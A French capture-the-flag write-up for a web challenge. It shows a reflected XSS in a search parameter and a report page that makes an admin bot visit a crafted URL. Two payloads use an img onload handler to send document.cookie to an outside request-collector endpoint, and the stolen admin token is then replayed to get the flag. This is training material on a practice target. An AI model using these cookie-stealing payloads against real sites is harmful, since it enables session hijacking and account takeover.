Le paramètre "search" est vulnérable au XSS
(on peut lui donner `<script>alert(1)</script>` et il affiche "1")

Entrer ";" fait bugger la base de données mais on a pas l'air de pouvoir injecter de truc. Ça ressemble plus à un chall XSS/CSRF que SQLi donc j'ai pas cherché plus loin dans cette direction et je me suis concentré sur le CSRF

On a un cookie ("token=xxxxxxxx") et la page de flag nous dit que notre token est invalide : on suppose que l'admin a aussi son cookie, il faut qu'on lui pique.

En plus de search, on a la page de report comme vecteur d'attaque.
Elle prend une url et la log quelque part en attendant la "review manuelle"/.
On peut probablement l'utiliser en conjonction avec search pour récupérer le cookie de l'admin et se l'envoyer quelque part.

On crée un endpoint sur requestbin pour récupérer le cookie une fois que l'admin aura cliqué sur notre lien malveillant (https://eoulvrfdli.m.pipedream.net)

Et on crée notre payload

`https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=<img onload=this.src='https://eoulvrfdli.m.pipedream.net?c='+document.cookie src="https://github.com/favicon.ico"/>`

Ça marche mais le paramètre "c" est vide. Probablement parce que l'URL le décode comme un espace et n'ajoute pas document.cookie au bazar, on réécrit le même sans le "+"

`https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=<img onload=this.src=\`https://eoulvrfdli.m.pipedream.net?c=${document.cookie}\` src="https://github.com/favicon.ico"/>`

Et on récupère le token admin :

token=O9Mv3sFaQD1UpQRLCXVOCzCi0dXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

On a juste à aller sur la page flag en éditant manuellement les headers de notre requête pour remplacer notre token par celui de l'admin (ça se fait bien avec les outils natifs de FF si t'as la flemme d'installer autre chose)
